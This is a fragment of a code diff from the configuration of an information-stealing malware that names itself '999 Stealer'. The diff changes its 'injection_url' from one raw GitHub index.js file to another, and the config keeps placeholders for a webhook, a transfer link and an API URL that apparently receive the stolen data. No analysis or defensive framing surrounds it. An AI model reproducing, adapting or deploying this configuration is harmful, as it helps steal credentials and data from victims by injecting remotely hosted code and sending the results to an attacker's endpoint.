@@ -23,7 +23,7 @@ var config = {
   creator: "999 Stealer",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/familigy/sub/main/index.js",
+    "https://raw.githubusercontent.com/0xFl4q/SalemAkhy/main/index.js",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
